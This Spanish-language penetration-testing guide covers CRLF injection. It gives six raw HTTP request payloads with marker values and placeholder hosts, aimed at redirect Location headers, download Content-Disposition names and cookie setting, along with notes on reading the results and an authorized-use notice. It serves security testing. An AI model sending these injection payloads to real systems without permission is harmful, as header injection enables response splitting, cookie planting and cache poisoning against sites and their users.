# 🗡️ CRLF injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

## 🔬 Pruebas por escenario

### 1. CRLF en Location

**Objetivo:** Parámetro que se coloca en la cabecera de una redirección.

```http
GET /redirect?next=%2Fok%0d%0aX-Prueba:%20prueba-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Buscar una cabecera X-Prueba separada en la respuesta cruda; texto dentro de Location no basta.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 2. LF sin CR

**Objetivo:** Algunas cadenas transforman o toleran LF aislado; comparar con CRLF.

```http
GET /redirect?next=%2Fok%0aX-Prueba:%20prueba-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Un nuevo campo HTTP prueba interpretación de salto; muchas pilas rechazan el valor.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 3. Doble codificación

**Objetivo:** Cuando el validador decodifica una vez y el sink otra; probar solo si hay evidencia de doble decode.

```http
GET /redirect?next=%2Fok%250d%250aX-Prueba:%20prueba-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** El `%0d%0a` literal en Location no es éxito; debe convertirse en delimitador final.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 4. Contenido de cabecera de descarga

**Objetivo:** Nombre de archivo devuelto en Content-Disposition, con archivo propio.

```http
GET /download?name=prueba.txt%0d%0aX-Prueba:%20descarga-123 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Comprobar nueva cabecera, no solo un nombre alterado.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 5. Set-Cookie inocua de prueba

**Objetivo:** Solo en cuenta propia y sesión aislada; no modificar cookies de otros.

```http
GET /redirect?next=%2Fok%0d%0aSet-Cookie:%20prueba=123;%20Path=/ HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Confirmar que el navegador almacena solo la cookie marcador; borrar después.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

### 6. CR aislado

**Objetivo:** Solo en laboratorio, para comprobar una normalización inesperada de CR sin LF en el valor de Location.

```http
GET /redirect?next=%2Fok%0dX-Prueba:%20prueba-123 HTTP/1.1
Host: {LAB_AISLADO}
```

**Interpretación:** HTTP exige CRLF como delimitador; éxito requiere observar una cabecera X-Prueba nueva en la respuesta cruda.

**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
